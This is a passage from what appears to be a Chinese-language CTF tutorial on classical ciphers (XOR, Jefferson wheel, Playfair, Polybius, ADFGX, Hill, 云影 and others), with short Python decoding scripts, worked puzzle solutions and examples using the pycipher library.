/td><td>1111000</td></tr><tr><td>L</td><td>1001100</td><td>Y</td><td>1011001</td><td>l</td><td>1101100</td><td>y</td><td>1111001</td></tr><tr><td>M</td><td>1001101</td><td>Z</td><td>1011010</td><td>m</td><td>1101101</td><td>z</td><td>1111010</td></tr></tbody></table><p>原本的ASCII是八位，去掉了第一位的0所以变成了现在这样子</p><ul><li>明文： HELLO= 1001000 1000101 1001100 1001100 1001111</li><li>密钥：CRUDE= 1000011 1010010 1010101 1000100 1000101</li><li>异或后的密文 = 0001011 0010111 0011001 0001000 0001010（得到这个不用再转成ASCII）</li></ul><p>异或（xor，python符号（^））：不同为1，相同为0，比如0异或1结果为1，0异或0结果为0。两次异或可以还原成原来的样子</p><p>利用上面的异或性质，可以使用密文跟密钥再次异或得到明文的二进制，然后转换成ASCII得到明文，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">content=&#x27;00010110010111001100100010000001010&#x27;</span><br><span class="line">key=&#x27;CRUDE&#x27;</span><br><span class="line">mi =[content[i:i+7] for i in range(0,len(content),7)]</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i,j in zip(mi,key):#在python中不仅二进制可以做异或，十进制也可以</span><br><span class="line">    print(chr(int(i,2)^ord(j)))</span><br></pre></td></tr></table></figure><h4 id="杰斐逊轮转加密"><a href="#杰斐逊轮转加密" class="headerlink" title="杰斐逊轮转加密"></a>杰斐逊轮转加密</h4><p>用一组相互独立的转轮，其上是以随机顺序写的26个字母表，这些轮可自由转动，使明文出现在一条直线上 ，而密文可以从其他任意直线选取。</p><p><img src="/image/media/2022/crypto/11.png"></p><p>杰斐逊轮转加密每个转轮相当于一个替换字母表，破解难度大，缺点就是传输信息有限，传输的信息不能超过转轮数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">一道题目：墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。 flag，是字符串，小写。</span><br><span class="line">1:   &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2:   &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3:   &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4:   &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5:   &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6:   &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7:   &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8:   &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9:   &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10:  &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line">密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6</span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>代码实现解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 杰斐逊轮转加密</span><br><span class="line">value = &#x27;&#x27;&#x27;1:&lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2:&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5:   &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6:   &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7:   &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8:   &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9:   &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10:  &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&#x27;&#x27;&#x27;</span><br><span class="line">new = []</span><br><span class="line">for i in value.split(&#x27;\n&#x27;):  # 根据换行来切片</span><br><span class="line">    new.append(i[i.index(&#x27;&lt;&#x27;) + 2:i.rindex(&#x27;&lt;&#x27;) - 1])  # 处理多余字符</span><br><span class="line">key = [int(i) for i in &#x27;2,3,7,5,13,12,9,1,8,10,4,11,6&#x27;.split(&#x27;,&#x27;)]  # 转成整数</span><br><span class="line">content = &#x27;NFQKSEVOQOFNP&#x27;  # 密文</span><br><span class="line">text = []</span><br><span class="line"># for i in range(len(content)):</span><br><span class="line">#     print(content[i:]+content[:i])</span><br><span class="line">for k, m in zip(key, content):</span><br><span class="line">    # print(new[k - 1][new[k - 1].index(m):]+new[k - 1][:new[k - 1].index(m)])</span><br><span class="line">    text.append(new[k - 1][new[k - 1].index(m):]+new[k - 1][:new[k - 1].index(m)])</span><br><span class="line"># print(text)</span><br><span class="line"></span><br><span class="line">flag=[]</span><br><span class="line">for i in range(26):#每个列取值</span><br><span class="line">    txt=&#x27;&#x27;</span><br><span class="line">    for j in text:</span><br><span class="line">        txt+=j[i]</span><br><span class="line">    flag.append(txt)</span><br><span class="line">print(flag)</span><br><span class="line">#17列，都是大写FIREINTHEHOLE</span><br></pre></td></tr></table></figure><h4 id="Playfair"><a href="#Playfair" class="headerlink" title="Playfair"></a>Playfair</h4><p>Playfair 密码（Playfair cipher or Playfair square）是一种替换密码，1854 年由英国人查尔斯 · 惠斯通（Charles Wheatstone）发明，基本算法如下：</p><ol><li>选取一串英文字母，除去重复出现的字母，将剩下的字母逐个逐个加入 5 × 5 的矩阵内，剩下的空间由未加入的英文字母依 a-z 的顺序加入。注意，将 q 去除，或将 i 和 j 视作同一字。</li><li>将要加密的明文分成两个一组。若组内的字母相同，将 X（或 Q）加到该组的第一个字母后，重新分组。若剩下一个字，也加入 X 。</li><li>在每组中，找出两个字母在矩阵中的地方。<ul><li>若两个字母不同行也不同列，在矩阵中找出另外两个字母（第一个字母对应行优先），使这四个字母成为一个长方形的四个角。</li><li>若两个字母同行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。</li><li>若两个字母同列，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</li></ul></li></ol><p>新找到的两个字母就是原本的两个字母加密的结果。</p><p>以 playfair example 为密匙，得5 × 5的矩阵，需要去掉重复的，并且在最后面将没有在里面的补充进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">P L A Y F</span><br><span class="line">I R E X M</span><br><span class="line">B C D G H</span><br><span class="line">K N O Q S</span><br><span class="line">T U V W Z</span><br></pre></td></tr></table></figure><p>要加密的讯息为 Hide the gold in the tree stump，将密文分成两个一组，如果组内字母一样第二位用X代替，如果最后一个只有一个也加入一个X，此处的tree结果就是TR EX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HI DE TH EG OL DI NT HE TR EX ES TU MP</span><br></pre></td></tr></table></figure><p>然后根据上面的矩阵和规则挨个寻找对应的字母组合，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">情况一：   情况二：情况三：</span><br><span class="line">I R E X MHI是明文I R E X MDE是明文I R E X MEX是明文</span><br><span class="line">B C D G HBM是密文B C D G HOD是密文XM是密文</span><br><span class="line">  K N O Q S</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BM OD ZB XD NA BE KU DM UI XM MO UV IF</span><br></pre></td></tr></table></figure><h4 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h4><p>Polybius （波利比奥斯）密码又称为棋盘密码，将给定的明文加密为两两组合的数字，密码表如下</p><p><img src="/image/media/2022/crypto/12.png" alt="x"></p><p>明文：HELLO，使用这个表格加密</p><p>密文：23 15 31 31 34</p><p>hint：i和j需要结合上下文取值</p><p>因为Polybius比较简单于是在这个基础上衍生了多种密码表，并且能够定制密码表比如A D F G X</p><h4 id="ADFGX密码"><a href="#ADFGX密码" class="headerlink" title="ADFGX密码"></a>ADFGX密码</h4><p>1918 年，第一次世界大战将要结束时，法军截获了一份德军电报，电文中的所有单词都由 A、D、F、G、X 五个字母拼成，因此被称为 ADFGX 密码。ADFGX 密码是 1918 年 3 月由德军上校 Fritz Nebel 发明的，是结合了 Polybius 密码和置换密码的双重加密方案。</p><p><img src="/image/media/2022/crypto/13.png" alt="x"></p><p>明文：HELLO，使用这个表格加密</p><p>密文：DD XF AG AG DF</p><p>hint：可以看到这两种密码的密文都是只有五种可能所以可以根据密文类型联想到上面两种密码，并且长度是二的倍数</p><ul><li>题目</li></ul><p>现有密文：ilnllliiikkninlekile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cipher = &quot;ilnllliiikkninlekile&quot;</span><br><span class="line">key = []</span><br><span class="line">for i in itertools.permutations(&#x27;ilnke&#x27;, 5):</span><br><span class="line">    key.append(&#x27;&#x27;.join(i))</span><br><span class="line">for now_key in key:</span><br><span class="line">    solve_c = &quot;&quot;</span><br><span class="line">    res = &quot;&quot;</span><br><span class="line">    for now_c in cipher:</span><br><span class="line">        solve_c += str(now_key.index(now_c))</span><br><span class="line">    for i in range(0,len(solve_c),2):</span><br><span class="line">        now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97</span><br><span class="line">        if now_ascii&gt;ord(&#x27;i&#x27;):</span><br><span class="line">            now_ascii+=1</span><br><span class="line">        res += chr(now_ascii)</span><br><span class="line">    if &quot;flag&quot; in res:</span><br><span class="line">        print (now_key,res)</span><br></pre></td></tr></table></figure><h4 id="Nihilist-密码"><a href="#Nihilist-密码" class="headerlink" title="Nihilist 密码"></a>Nihilist 密码</h4><p>Nihilist 密码又称关键字密码：明文 + 关键字 = 密文。以关键字 helloworld 为例。</p><p>首先利用密钥构造棋盘矩阵（类似 Polybius 密码），新建一个 5 × 5 矩阵，将字符不重复地依次填入矩阵，剩下部分按字母顺序填入，字母 i 和 j 等价</p><p><img src="/image/media/2022/crypto/14.png" alt="x"></p><p>对于加密过程参照矩阵 M 进行加密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a -&gt; M[2,3] -&gt; 23</span><br><span class="line">t -&gt; M[4,5] -&gt; 45</span><br></pre></td></tr></table></figure><p>对于解密过程</p><p>参照矩阵 M 进行解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">23 -&gt; M[2,3] -&gt; a</span><br><span class="line">45 -&gt; M[4,5] -&gt; t</span><br></pre></td></tr></table></figure><p>hint：密文都是数字并且长度是偶数，而只包含 1 到 5</p><h4 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h4><p>希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即 A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。注意用作加密的矩阵（即密匙）必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。</p><p>明文：ACT，转化为矩阵</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">2</span><br><span class="line">19</span><br></pre></td></tr></table></figure><p>现有密钥矩阵：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6241</span><br><span class="line">131610</span><br><span class="line">201715</span><br></pre></td></tr></table></figure><p>然后解密过程可以表示为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[6241 ][0][6*0+24*2+1*19][67][15]</span><br><span class="line">[131610][2]= [13*0+16*2+10*19]=[222]mod 26=[14]</span><br><span class="line">[201715][19][20*0+17*2+15*19][319][7]</span><br></pre></td></tr></table></figure><p>所以得到密文为：POH</p><ul><li>题目</li></ul><p>密文： 22,09,00,12,03,01,10,03,04,08,01,17 （wjamdbkdeibr）</p><p>使用的矩阵是 1 2 3 4 5 6 7 8 10</p><p>首先，矩阵是 3 × 3 的。说明每次加密 3 个字符。</p><p>这个矩阵是按照列来排布的。即如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 4 7</span><br><span class="line">2 5 8</span><br><span class="line">3 6 10</span><br></pre></td></tr></table></figure><p>最后的结果为 overthehillx</p><h3 id="其他类型的加密"><a href="#其他类型的加密" class="headerlink" title="其他类型的加密"></a>其他类型的加密</h3><h4 id="当铺密码"><a href="#当铺密码" class="headerlink" title="当铺密码"></a>当铺密码</h4><p>当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几</p><p>当铺密码是一种将汉字和数字进行转化的密码</p><p>算法相当简单，当前汉字有多少笔画出头，就是转化为数字几</p><p>例如羊这个字，出头的地方有九个，所以转化为9</p><p>那么”羊由大井夫大人王中工”可以转为以下数字：</p><p>9158753624</p><h4 id="云影加密"><a href="#云影加密" class="headerlink" title="云影加密"></a>云影加密</h4><p>该密码又称为01248 密码 ，使用 0，1，2，4，8 四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28=10，124=7，18=9，再用 1-&gt;26 表示 A-&gt;Z。</p><p>hint：云影加密只有 0，1，2，4，8</p><ul><li>题目</li></ul><p>8842101220480224404014224202480122，根据0来切割得到</p><table><thead><tr><th>切片结果</th><th>运算</th><th>运算结果</th><th>结果对应的字符</th></tr></thead><tbody><tr><td>88421</td><td>8+8+4+2+1</td><td>23</td><td>W</td></tr><tr><td>122</td><td>1+2+2</td><td>5</td><td>E</td></tr><tr><td>48</td><td>4+8</td><td>12</td><td>L</td></tr><tr><td>2244</td><td>2+2+4+4</td><td>12</td><td>L</td></tr><tr><td>4</td><td>4</td><td>4</td><td>D</td></tr><tr><td>142242</td><td>1+4+2+2+4+2</td><td>15</td><td>O</td></tr><tr><td>248</td><td>2+4+8</td><td>14</td><td>N</td></tr><tr><td>122</td><td>1+2+2</td><td>5</td><td>E</td></tr></tbody></table><p>所以解密结果为：WELLDONE</p><p>python代码实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">content=&#x27;8842101220480224404014224202480122&#x27;</span><br><span class="line">charList = [chr(i) for i in range(ord(&#x27;A&#x27;), ord(&#x27;Z&#x27;) + 1)]</span><br><span class="line">ret = []</span><br><span class="line">plaintext = [i for i in content.split(&#x27;0&#x27;)]</span><br><span class="line">for i in plaintext:</span><br><span class="line">    tmp = 0</span><br><span class="line">    for j in range(len(i)):</span><br><span class="line">        tmp += int(i[j])</span><br><span class="line">    ret.append(charList[tmp - 1])</span><br><span class="line">print(&#x27;云影密码&#x27;, &#x27;&#x27;.join(ret))</span><br></pre></td></tr></table></figure><h4 id="base家族解密"><a href="#base家族解密" class="headerlink" title="base家族解密"></a>base家族解密</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">##base家族解密</span><br><span class="line">import base64</span><br><span class="line">import base128</span><br><span class="line">import base36</span><br><span class="line">import base58</span><br><span class="line">import base91</span><br><span class="line">import py3base92</span><br><span class="line"></span><br><span class="line">content = 密文信息</span><br><span class="line">num=[]</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        content = base64.b16decode(content).decode()</span><br><span class="line">        num.append(&#x27;base16&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base64.b32decode(content).decode()</span><br><span class="line">        num.append(&#x27;base32&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base36.dumps(content).decode()</span><br><span class="line">        num.append(&#x27;base36&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base58.b58decode(content).decode()</span><br><span class="line">        num.append(&#x27;base58&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base64.b64decode(content).decode()</span><br><span class="line">        num.append(&#x27;base64&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base64.b85decode(content).decode()</span><br><span class="line">        num.append(&#x27;base85&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base64.a85decode(content).decode()</span><br><span class="line">        num.append(&#x27;base85&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = base91.decode(content).decode()</span><br><span class="line">        num.append(&#x27;base91&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = py3base92.b92decode(content).decode()</span><br><span class="line">        num.append(&#x27;base92&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        content = b&#x27;&#x27;.join(base128.base128(chars = None, chunksize = 7) .decode(content)).decode()</span><br><span class="line">        num.append(&#x27;base128&#x27;)</span><br><span class="line">        continue</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    break</span><br><span class="line">print(num)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure><h2 id="pycipher库的使用"><a href="#pycipher库的使用" class="headerlink" title="pycipher库的使用"></a>pycipher库的使用</h2><p>pycipher是python的一个函数库，使用pip install pycipher即可安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pycipher</span><br><span class="line">&gt;&gt;&gt; dir(pycipher)</span><br><span class="line">[&#x27;ADFGVX&#x27;, &#x27;ADFGX&#x27;, &#x27;Affine&#x27;, &#x27;Atbash&#x27;, &#x27;Autokey&#x27;, &#x27;Beaufort&#x27;, &#x27;Bifid&#x27;, &#x27;Caesar&#x27;, &#x27;ColTrans&#x27;, &#x27;Enigma&#x27;, &#x27;Foursquare&#x27;, &#x27;FracMorse&#x27;, &#x27;Gronsfeld&#x27;, &#x27;M209&#x27;, &#x27;Playfair&#x27;, &#x27;PolybiusSquare&#x27;, &#x27;Porta&#x27;, &#x27;Railfence&#x27;, &#x27;Rot13&#x27;, &#x27;SimpleSubstitution&#x27;, &#x27;Vigenere&#x27;, &#x27;__all__&#x27;, &#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__path__&#x27;, &#x27;__spec__&#x27;, &#x27;__version__&#x27;, &#x27;adfgvx&#x27;, &#x27;adfgx&#x27;, &#x27;affine&#x27;, &#x27;atbash&#x27;, &#x27;autokey&#x27;, &#x27;base&#x27;, &#x27;beaufort&#x27;, &#x27;bifid&#x27;, &#x27;caesar&#x27;, &#x27;columnartransposition&#x27;, &#x27;enigma&#x27;, &#x27;foursquare&#x27;, &#x27;fracmorse&#x27;, &#x27;gronsfeld&#x27;, &#x27;m209&#x27;, &#x27;playfair&#x27;, &#x27;polybius&#x27;, &#x27;porta&#x27;, &#x27;pycipher&#x27;, &#x27;railfence&#x27;, &#x27;rot13&#x27;, &#x27;simplesubstitution&#x27;, &#x27;util&#x27;, &#x27;vigenere&#x27;]</span><br></pre></td></tr></table></figure><p>使用dir(pycipher)可以查询包括的类，能够实现多种古典密码的加解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; help(pycipher.Caesar)</span><br><span class="line">Help on class Caesar in module pycipher.caesar:</span><br><span class="line">class Caesar(pycipher.base.Cipher)</span><br><span class="line"> |  Caesar(key=13)</span><br><span class="line"> |  The Caesar Cipher has a key consisting of an integer 1-25.</span><br><span class="line"> |  This cipher encrypts a letter according to the following equation::</span><br><span class="line"> |</span><br><span class="line"> |      c = (p + key)%26</span><br><span class="line"> |</span><br><span class="line"> |  where c is the ciphertext letter, p the plaintext letter.</span><br><span class="line"> |  For more details on the Caesar cipher, see http://www.practicalcryptography.com/ciphers/caesar-cipher/</span><br><span class="line"> |  :param key: The additive key. Allowable values are integers 0-25.</span><br><span class="line"> |</span><br><span class="line"> |  Method resolution order:</span><br><span class="line"> |      Caesar</span><br><span class="line"> |      pycipher.base.Cipher</span><br><span class="line"> |      builtins.object</span><br><span class="line"> |  Methods defined here:</span><br><span class="line"> |  __init__(self, key=13)</span><br><span class="line"> |      Initialize self.  See help(type(self)) for accurate signature.</span><br><span class="line"> |</span><br><span class="line"> |  decipher(self, string, keep_punct=False)</span><br><span class="line"> |      Decipher string using Caesar cipher according to initialised key.</span><br><span class="line"> |      Example::</span><br><span class="line"> |</span><br><span class="line"> |          plaintext = Caesar(3).decipher(ciphertext)</span><br><span class="line"> |</span><br><span class="line"> |      :param string: The string to decipher.</span><br><span class="line"> |      :param keep_punct: if true, punctuation and spacing are retained. If false, it is all removed. Default is False.</span><br><span class="line"> |      :returns: The deciphered string.</span><br><span class="line"> |</span><br><span class="line"> |  encipher(self, string, keep_punct=False)</span><br><span class="line"> |      Encipher string using Caesar cipher according to initialised key.</span><br><span class="line"> |      Example::</span><br><span class="line"> |</span><br><span class="line"> |          ciphertext = Caesar(3).encipher(plaintext)</span><br><span class="line"> |</span><br><span class="line"> |      :param string: The string to encipher.</span><br><span class="line"> |      :param keep_punct: if true, punctuation and spacing are retained. If false, it is all removed. Default is False.</span><br><span class="line"> |      :returns: The enciphered string.</span><br></pre></td></tr></table></figure><p>可以使用help(pycipher.Caesar)对一个类里面包含的函数信息</p><p>栅栏密码快速实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pycipher</span><br><span class="line">&gt;&gt;&gt; pycipher.Caesar(3).decipher(&quot;IODJ&#123;Khuh_lv_brxu_iodj&#125;&quot;)</span><br><span class="line">&#x27;FLAGHEREISYOURFLAG&#x27;</span><br></pre></td></tr></table></figure><p>可以看到encipher加密和decipher解密，但是需要指定密钥，然后输出有只有大写，可以修改</p><p>Atbash Cipher密码脚本可以快速实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from pycipher import Atbash</span><br><span class="line">&gt;&gt;&gt;Atbash().encipher(&#x27;defend the east wall of the castle&#x27;)</span><br><span class="line">&#x27;wvuvmwgsvvzhgdzoolugsvxzhgov&#x27;</span><br><span class="line">&gt;&gt;&gt;Atbash().decipher(&#x27;wvuvmwgsvvzhgdzoolugsvxzhgov&#x27;)</span><br><span class="line">&#x27;defendtheeastwallofthecastle&#x27;</span><br></pre></td></tr></table></figure><p>仿射密码快速实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pycipher</span><br><span class="line">&gt;&gt;&gt; pycipher.Affine(11,7).decipher(&#x27;dikxourxd&#x27;)</span><br><span class="line">&#x27;CTFSDNISC&#x27;</span><br><span class="line">&gt;&gt;&gt; 